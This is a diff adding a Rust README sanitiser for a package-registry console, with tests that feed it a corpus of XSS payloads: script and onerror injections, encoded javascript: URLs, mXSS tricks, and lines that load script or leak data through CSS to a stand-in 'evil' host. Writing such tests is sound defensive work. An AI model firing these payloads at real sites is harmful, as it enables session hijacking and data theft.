@@ -1,0 +1,522 @@
+//! The allow-list, and the only path from a package's text to the console.
+//!
+//! This is the highest-risk surface the console has: anyone who can publish to a
+//! proxied upstream can author the input, and the output is rendered on the
+//! console's own origin to a session that is frequently an administrator's. So
+//! the model is **deny by default** — an allow-list over an `html5ever` parse,
+//! not a regex and not an escape pass — and there is no path from source to
+//! output that skips this module. The fuzz target
+//! (`fuzz/fuzz_targets/fuzz_readme_render.rs`) exists to keep it that way.
+//!
+//! What an attacker gains and what they already had is worth stating: a
+//! malicious package already runs code on a developer's machine at install time,
+//! and that is what the firewall rules, the release-age gate and the advisories
+//! address. What is genuinely new here is a path from *publishing text* to
+//! *markup in an operator's authenticated session* (RFC 0007 §7.2).
+
+use std::collections::{HashMap, HashSet};
+
+use crate::services::hot_config::RemoteImagePolicy;
+
+/// The version of the render + sanitise pipeline.
+///
+/// Part of the render cache key, so a fix here invalidates every stored
+/// rendering in one commit with no backfill — which is the whole reason the
+/// store keeps the *source* rather than the HTML (RFC 0007 §5.3).
+///
+/// **Bump this whenever the allow-list, the link handling, the image handling or
+/// the markdown extension set changes.** A sanitiser fix that did not bump it
+/// would leave every already-rendered README serving the vulnerable output until
+/// its cache entry expired on its own.
+/// History: `2` chips raw-HTML `<img>` — and therefore `<picture>` — instead of
+/// letting it render to nothing (RFC 0007-bis §13.1).
+pub const RENDERER_VERSION: u32 = 2;
+
+/// The class the renderer puts on the chip that replaces a stripped image.
+///
+/// Allow-listed by name rather than by pattern: a package author writing this
+/// same class themselves gets a chip that looks like ours and says nothing they
+/// could not have said in plain text, which is harmless — while `class="*"`
+/// would hand them the console's whole stylesheet.
+pub const STRIPPED_IMAGE_CLASS: &str = "readme-stripped-image";
+
+/// Every element a README may contain.
+///
+/// Everything else is dropped, including `script`, `iframe`, `object`, `embed`,
+/// `form`, `input` and `svg`. `style` goes entirely — both the element and the
+/// attribute — because CSS is not decoration in this threat model: it is the
+/// mechanism for overlaying the console's own controls, and attribute selectors
+/// are an exfiltration channel.
+const ALLOWED_TAGS: &[&str] = &[
+    "h1",
+    "h2",
+    "h3",
+    "h4",
+    "h5",
+    "h6",
+    "p",
+    "br",
+    "hr",
+    "em",
+    "strong",
+    "del",
+    "s",
+    "sub",
+    "sup",
+    "ul",
+    "ol",
+    "li",
+    "blockquote",
+    "pre",
+    "code",
+    "table",
+    "thead",
+    "tbody",
+    "tfoot",
+    "tr",
+    "th",
+    "td",
+    "a",
+    "img",
+    "span",
+    "div",
+    "details",
+    "summary",
+    "input",
+];
+
+/// Build the sanitiser for one registry's policy.
+///
+/// A fresh `Builder` per call rather than a lazily-initialised static: the
+/// configuration differs per registry (`remote_images`), the render cache means
+/// this runs once per distinct document rather than once per page view, and a
+/// shared mutable builder is a footgun in a hot-reloadable server.
+fn builder(
+    policy: RemoteImagePolicy,
+    image_proxy_prefix: Option<&str>,
+) -> ammonia::Builder<'static> {
+    let mut b = ammonia::Builder::default();
+
+    let mut tags: HashSet<&str> = ALLOWED_TAGS.iter().copied().collect();
+    // With images stripped, `img` is not in the allow-list at all: an element
+    // whose only purpose is to issue a request must not survive the pass that
+    // decides what may issue requests. GFM images become chips before they get
+    // here (see `render.rs`); an `Html`-format README's images are dropped,
+    // which is a smaller loss than a beacon.
+    if policy == RemoteImagePolicy::Strip || image_proxy_prefix.is_none() {
+        tags.remove("img");
+    }
+    b.tags(tags);
+
+    // `style` is not an attribute a README may carry, anywhere. `id` is
+    // allowed only so that `id_prefix` below can namespace it — an id that were
+    // dropped outright would break every in-document anchor a long README has.
+    b.generic_attributes(HashSet::from(["title", "id"]));
+    b.tag_attributes(HashMap::from([
+        ("a", HashSet::from(["href"])),
+        ("img", HashSet::from(["src", "alt", "width", "height"])),
+        ("td", HashSet::from(["align", "colspan", "rowspan"])),
+        ("th", HashSet::from(["align", "colspan", "rowspan"])),
+        ("ol", HashSet::from(["start"])),
+        // GFM task lists render as disabled checkboxes. `type` and `checked`
+        // only, and `disabled` is forced below — an enabled input inside a
+        // README is a form control an operator could be tricked into using.
+        ("input", HashSet::from(["type", "checked"])),
+    ]));
+    // *Set*, not merely allow: `add_tag_attribute_values` would permit the
+    // value if the author wrote it, which is the opposite of what is wanted.
+    b.set_tag_attribute_value("input", "disabled", "");
+    // Only our own class names survive; a package author's `class="…"` is
+    // dropped rather than being handed the console's stylesheet. `class` is
+    // deliberately absent from `tag_attributes` above — ammonia asserts the two
+    // are mutually exclusive, because listing it there would let *any* value
+    // through and make this allow-list decorative.
+    b.allowed_classes(HashMap::from([(
+        "span",
+        HashSet::from([STRIPPED_IMAGE_CLASS]),
+    )]));
+
+    // `javascript:`, `data:` and `vbscript:` are dropped rather than rewritten.
+    // `data:` is dropped for images too, despite the CSP permitting it: a data
+    // URI in a README is megabytes of base64 in a database row, and an SVG data
+    // URI is script.
+    b.url_schemes(HashSet::from(["http", "https", "mailto"]));
+
+    // Unprefixed ids from untrusted markup shadow `document.getElementById` and
+    // named-access properties on `window` — DOM clobbering — and can hijack the
+    // page's own anchor targets.
+    b.id_prefix(Some("readme-"));
+
+    // A README cannot reach back through `window.opener`, and cannot lend the
+    // instance's reputation to a link farm.
+    b.link_rel(Some("nofollow ugc noopener noreferrer"));
+    b.set_tag_attribute_value("a", "target", "_blank");
+
+    // A relative `src`/`href` in a README has no base to resolve against — the
+    // package's own repository is not this origin — so it is dropped rather
+    // than resolved into a link to somewhere on the console.
+    b.url_relative(ammonia::UrlRelative::Deny);
+
+    if let (RemoteImagePolicy::Proxy, Some(prefix)) = (policy, image_proxy_prefix) {
+        // Every remote image is rewritten to go through this server, so the
+        // reader's browser never talks to a host the package author chose. The
+        // prefix is built by the caller from the request's own base URL.
+        //
+        // An attribute filter rather than `UrlRelative::RewriteWithBase`, which
+        // only rebases *relative* URLs and would leave an absolute badge URL
+        // pointing straight at the third-party host — the beacon this exists to
+        // remove.
+        let prefix = prefix.to_owned();
+        b.attribute_filter(move |element, attribute, value| {
+            if element != "img" || attribute != "src" {
+                return Some(std::borrow::Cow::Borrowed(value));
+            }
+            if value.starts_with("http://") || value.starts_with("https://") {
+                return Some(std::borrow::Cow::Owned(format!(
+                    "{prefix}{}",
+                    encode_query_value(value)
+                )));
+            }
+            // A relative or `data:` src has nothing to proxy: dropped, which
+            // leaves an `img` with no `src` for the panel to hide.
+            None
+        });
+    }
+
+    b
+}
+
+/// Percent-encode a URL so it can travel as a query-string value.
+///
+/// Written out rather than pulled in: `core` has no URL crate, this is the one
+/// place that needs it, and the rule is short enough to read — everything
+/// outside the RFC 3986 unreserved set is escaped, which is strictly more than
+/// a query value needs and therefore always correct.
+fn encode_query_value(raw: &str) -> String {
+    let mut out = String::with_capacity(raw.len() * 3 / 2);
+    for byte in raw.bytes() {
+        match byte {
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
+                out.push(byte as char)
+            }
+            _ => out.push_str(&format!("%{byte:02X}")),
+        }
+    }
+    out
+}
+
+/// Sanitise `html` for display on the console origin.
+///
+/// The single choke point. Raw HTML inside markdown reaches this too:
+/// `pulldown-cmark` passes it through, and it goes to the same allow-list as an
+/// `Html`-format document.
+pub fn sanitize(html: &str, policy: RemoteImagePolicy, image_proxy_prefix: Option<&str>) -> String {
+    builder(policy, image_proxy_prefix).clean(html).to_string()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn clean(html: &str) -> String {
+        sanitize(html, RemoteImagePolicy::Strip, None)
+    }
+
+    // ── The standard vectors ──────────────────────────────────────────────────
+    //
+    // Each asserts the *specific* removal, not merely "no script": a test that
+    // only greps for `<script` passes on output that still carries an `onerror`.
+
+    #[test]
+    fn script_elements_are_removed_with_their_contents() {
+        let out = clean("<p>before</p><script>alert(1)</script><p>after</p>");
+        assert!(!out.contains("script"), "{out}");
+        assert!(!out.contains("alert"), "{out}");
+        assert!(out.contains("before") && out.contains("after"), "{out}");
+    }
+
+    #[test]
+    fn event_handler_attributes_are_removed() {
+        let out = clean(r#"<p onclick="steal()">text</p><a href="/x" onmouseover="x">l</a>"#);
+        assert!(!out.contains("onclick"), "{out}");
+        assert!(!out.contains("onmouseover"), "{out}");
+        assert!(out.contains("text"), "{out}");
+    }
+
+    #[test]
+    fn an_img_onerror_cannot_survive_in_any_form() {
+        let out = clean(r#"<img src="x" onerror="alert(1)">"#);
+        assert!(!out.contains("onerror"), "{out}");
+        assert!(!out.contains("<img"), "{out}");
+    }
+
+    #[test]
+    fn javascript_and_data_and_vbscript_urls_are_dropped() {
+        for href in [
+            "javascript:alert(1)",
+            "JaVaScRiPt:alert(1)",
+            "data:text/html;base64,PHNjcmlwdD4=",
+            "vbscript:msgbox(1)",
+            // An entity-encoded scheme is the same scheme.
+            "&#106;avascript:alert(1)",
+        ] {
+            let out = clean(&format!(r#"<a href="{href}">click</a>"#));
+            assert!(!out.contains("javascript"), "{href} → {out}");
+            assert!(!out.contains("vbscript"), "{href} → {out}");
+            assert!(!out.contains("data:"), "{href} → {out}");
+            // The text survives; only the link goes.
+            assert!(out.contains("click"), "{href} → {out}");
+        }
+    }
+
+    #[test]
+    fn http_https_and_mailto_links_survive() {
+        for href in [
+            "https://example.com/x",
+            "http://example.com/x",
+            "mailto:x@example.com",
+        ] {
+            let out = clean(&format!(r#"<a href="{href}">click</a>"#));
+            assert!(out.contains(href), "{href} → {out}");
+        }
+    }
+
+    /// CSS is not decoration in this threat model: it is the mechanism for
+    /// overlaying the console's own controls, and attribute selectors are an
+    /// exfiltration channel.
+    #[test]
+    fn style_goes_entirely_element_and_attribute() {
+        let out = clean(
+            r#"<style>a[href^="http"]{background:url(//evil/?)}</style>
+               <p style="position:fixed;inset:0;z-index:9999">covering</p>"#,
+        );
+        assert!(!out.contains("style"), "{out}");
+        assert!(!out.contains("evil"), "{out}");
+        assert!(out.contains("covering"), "{out}");
+    }
+
+    #[test]
+    fn svg_iframe_object_embed_and_form_are_all_dropped() {
+        let out = clean(
+            r#"<svg><script>alert(1)</script></svg>
+               <iframe srcdoc="<script>alert(1)</script>"></iframe>
+               <object data="x"></object><embed src="x">
+               <form action="/x"><input name="p" type="password"></form>"#,
+        );
+        for forbidden in ["svg", "iframe", "srcdoc", "object", "embed", "<form"] {
+            assert!(!out.contains(forbidden), "{forbidden} survived: {out}");
+        }
+    }
+
+    /// Unprefixed ids from untrusted markup shadow `document.getElementById`
+    /// and named-access properties on `window`, and can hijack the page's own
+    /// anchor targets.
+    #[test]
+    fn ids_are_prefixed_so_they_cannot_clobber_the_consoles_own() {
+        let out = clean(r#"<div id="app">x</div><h2 id="attributes">y</h2>"#);
+        assert!(!out.contains(r#"id="app""#), "{out}");
+        assert!(out.contains(r#"id="readme-app""#), "{out}");
+        assert!(out.contains(r#"id="readme-attributes""#), "{out}");
+    }
+
+    #[test]
+    fn links_carry_the_full_rel_and_open_in_a_new_tab() {
+        let out = clean(r#"<a href="https://example.com">x</a>"#);
+        assert!(out.contains("nofollow"), "{out}");
+        assert!(out.contains("ugc"), "{out}");
+        assert!(out.contains("noopener"), "{out}");
+        assert!(out.contains("noreferrer"), "{out}");
+        assert!(out.contains(r#"target="_blank""#), "{out}");
+    }
+
+    /// A `<details>` is allowed, and its contents go through the same
+    /// allow-list — collapsing hostile markup does not exempt it.
+    #[test]
+    fn details_is_allowed_but_its_contents_are_not_exempt() {
+        let out = clean("<details><summary>more</summary><script>alert(1)</script>ok</details>");
+        assert!(out.contains("<details>"), "{out}");
+        assert!(out.contains("more") && out.contains("ok"), "{out}");
+        assert!(!out.contains("script"), "{out}");
+    }
+
+    /// A relative link has no base to resolve against — the package's own
+    /// repository is not this origin — so it is dropped rather than turned into
+    /// a link to somewhere on the console.
+    #[test]
+    fn relative_urls_are_dropped_not_resolved_against_the_console() {
+        let out = clean(r#"<a href="/api/v1/admin/packages/delete">docs</a>"#);
+        assert!(!out.contains("/api/v1/admin"), "{out}");
+        assert!(out.contains("docs"), "{out}");
+    }
+
+    #[test]
+    fn a_package_authors_own_classes_are_dropped() {
+        let out = clean(r#"<span class="console-danger-button">Delete</span>"#);
+        assert!(!out.contains("console-danger-button"), "{out}");
+        assert!(out.contains("Delete"), "{out}");
+    }
+
+    /// The chip the renderer emits for a stripped image survives, because the
+    /// panel styles it — and it is the only class that does.
+    #[test]
+    fn the_stripped_image_chip_survives() {
+        let out = clean(&format!(
+            r#"<span class="{STRIPPED_IMAGE_CLASS}" title="img.shields.io">build status</span>"#
+        ));
+        assert!(out.contains(STRIPPED_IMAGE_CLASS), "{out}");
+        assert!(out.contains("build status"), "{out}");
+    }
+
+    /// A GFM task list is a checkbox, and it must not be one an operator can
+    /// interact with.
+    #[test]
+    fn task_list_checkboxes_are_disabled() {
+        let out = clean(r#"<input type="checkbox" checked>"#);
+        assert!(out.contains("disabled"), "{out}");
+        // And a text input is still an input element, so it is disabled too —
+        // there is no form for it to submit to, since `form` is dropped.
+        let out = clean(r#"<input type="password" name="p">"#);
+        assert!(!out.contains(r#"name="p""#), "{out}");
+    }
+
+    /// With images proxied, `img` survives and its `src` is rewritten to this
+    /// server — so the reader's browser still never talks to a host the package
+    /// author chose.
+    #[test]
+    fn proxied_images_are_rewritten_through_this_server() {
+        let out = sanitize(
+            r#"<img src="https://img.shields.io/badge/x.svg" alt="badge">"#,
+            RemoteImagePolicy::Proxy,
+            Some("https://hub.example.com/api/v1/readme-image/"),
+        );
+        assert!(out.contains("<img"), "{out}");
+        assert!(out.contains("hub.example.com"), "{out}");
+        assert!(out.contains(r#"alt="badge""#), "{out}");
+        // The original URL travels percent-encoded as a query value, so the
+        // third-party host appears only inside the parameter — never as a host
+        // the browser resolves.
+        assert!(out.contains("img.shields.io"), "{out}");
+        assert!(!out.contains("https://img.shields.io"), "{out}");
+    }
+
+    /// A relative or `data:` src has nothing to proxy, so it is dropped —
+    /// `proxy` is not a way to smuggle one through.
+    #[test]
+    fn a_non_http_src_is_dropped_even_under_proxy() {
+        for src in ["./local.png", "data:image/png;base64,AAAA", "/x.png"] {
+            let out = sanitize(
+                &format!(r#"<img src="{src}" alt="x">"#),
+                RemoteImagePolicy::Proxy,
+                Some("https://hub.example.com/api/v1/readme-image?url="),
+            );
+            assert!(!out.contains("src="), "{src} → {out}");
+        }
+    }
+
+    #[test]
+    fn query_encoding_escapes_everything_outside_the_unreserved_set() {
+        assert_eq!(
+            encode_query_value("https://a.example/x?y=1&z=2"),
+            "https%3A%2F%2Fa.example%2Fx%3Fy%3D1%26z%3D2"
+        );
+        assert_eq!(encode_query_value("aZ0-_.~"), "aZ0-_.~");
+        // Multi-byte characters are escaped byte by byte, which is what a query
+        // value has to be.
+        assert_eq!(encode_query_value("é"), "%C3%A9");
+    }
+
+    /// `proxy` with no prefix to rewrite to is not "load it directly": there is
+    /// no configuration in which a README's image reaches out from the reader's
+    /// browser.
+    #[test]
+    fn proxy_without_a_prefix_still_strips() {
+        let out = sanitize(
+            r#"<img src="https://img.shields.io/badge/x.svg" alt="badge">"#,
+            RemoteImagePolicy::Proxy,
+            None,
+        );
+        assert!(!out.contains("<img"), "{out}");
+        assert!(!out.contains("shields.io"), "{out}");
+    }
+
+    /// Plain text passes through with its markup-significant characters
+    /// escaped, rather than being dropped as unknown markup.
+    #[test]
+    fn text_content_is_escaped_not_discarded() {
+        let out = clean("5 < 6 && 7 > 6");
+        assert!(out.contains("&lt;"), "{out}");
+        assert!(out.contains("&gt;"), "{out}");
+    }
+
+    // ── The corpus the fuzz target also runs ─────────────────────────────────
+
+    /// The same invariant `fuzz/fuzz_targets/fuzz_readme_render.rs` asserts, over
+    /// a fixed corpus, so it is checked by `cargo test` and not only by a
+    /// nightly job somebody has to remember to run.
+    ///
+    /// The corpus is the shapes that have historically broken allow-list
+    /// sanitisers: nesting that confuses a naive parser, mixed-case and
+    /// entity-encoded schemes, mXSS through `noscript`/`template`/comment
+    /// re-parsing, and attribute values that close their own tag.
+    #[test]
+    fn no_input_in_the_corpus_produces_script_a_handler_or_a_bad_scheme() {
+        const CORPUS: &[&str] = &[
+            "<script>alert(1)</script>",
+            "<scr<script>ipt>alert(1)</script>",
+            "<SCRIPT SRC=//evil/x.js></SCRIPT>",
+            "<img src=x onerror=alert(1)>",
+            "<img src=`x` onerror=alert(1)>",
+            "<body onload=alert(1)>",
+            "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
+            "<a href=\"&#106;avascript:alert(1)\">x</a>",
+            "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
+            "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
+            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+            "<template><script>alert(1)</script></template>",
+            "<!--<img src=--><img src=x onerror=alert(1)//>",
+            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+            "<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>",
+            "<form><button formaction=javascript:alert(1)>x</button></form>",
+            "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>",
+            "<style>@import \"//evil/x.css\";</style>",
+            "<div style=\"background:url(javascript:alert(1))\">x</div>",
+            "<input type=image src=x onerror=alert(1)>",
+            "<details open ontoggle=alert(1)>x</details>",
+            "<a href=\"//evil\" onclick=\"alert(1)\">x</a>",
+            "<p id=app>clobber</p><p id=__proto__>x</p>",
+        ];
+
+        // Deeply nested, so the parser's own limits cannot become a bypass by
+        // truncating mid-tag.
+        let deep = format!(
+            "{}<script>alert(1)</script>{}",
+            "<div>".repeat(500),
+            "</div>".repeat(500)
+        );
+
+        for input in CORPUS.iter().copied().chain(std::iter::once(deep.as_str())) {
+            for policy in [RemoteImagePolicy::Strip, RemoteImagePolicy::Proxy] {
+                let out = sanitize(input, policy, Some("https://hub.invalid/i?url="));
+                let lower = out.to_ascii_lowercase();
+                assert!(!lower.contains("<script"), "{input:?} → {out:?}");
+                assert!(!lower.contains("onerror"), "{input:?} → {out:?}");
+                assert!(!lower.contains("onload"), "{input:?} → {out:?}");
+                assert!(!lower.contains("ontoggle"), "{input:?} → {out:?}");
+                assert!(!lower.contains("onbegin"), "{input:?} → {out:?}");
+                assert!(!lower.contains("onclick"), "{input:?} → {out:?}");
+                assert!(!lower.contains("formaction"), "{input:?} → {out:?}");
+                assert!(!lower.contains("srcdoc"), "{input:?} → {out:?}");
+                // `="` before the scheme, not `"` alone: a README that
+                // discusses `javascript:` in prose keeps the words, and only an
+                // attribute value can execute. The fuzz target learned this the
+                // hard way — see its comment.
+                assert!(!lower.contains("=\"javascript:"), "{input:?} → {out:?}");
+                assert!(!lower.contains("=\"data:"), "{input:?} → {out:?}");
+                assert!(!lower.contains("style"), "{input:?} → {out:?}");
+                // Nothing may carry an unprefixed id out of untrusted markup.
+                assert!(!lower.contains("id=\"app\""), "{input:?} → {out:?}");
+                assert!(!lower.contains("id=\"__proto__\""), "{input:?} → {out:?}");
+            }
+        }
+    }
+}
